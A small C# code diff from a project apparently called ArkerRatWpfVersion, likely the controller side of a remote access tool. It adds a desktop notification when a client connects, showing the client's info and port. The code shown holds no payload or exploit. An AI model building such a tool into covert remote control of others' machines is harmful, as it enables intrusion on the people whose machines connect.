@@ -201,7 +201,9 @@ namespace ArkerRatWpfVersion
                             for (int i = 0; i < tempInfo.Length; i++)
                             {
                                 clientInfo[i] = tempInfo[i];
-                            }        
+                            }
+
+                            Task.Run(async() => GlobalMethods.ShowNotification("Client connected", clientInfo[0]+" has connected at port:"+port));
                         }                      
                     }
                     else
@@ -212,6 +214,8 @@ namespace ArkerRatWpfVersion
               
             } while (true);
         }
+
+
 
         string whenToStartPinging = "";
         Stopwatch stopwatch;
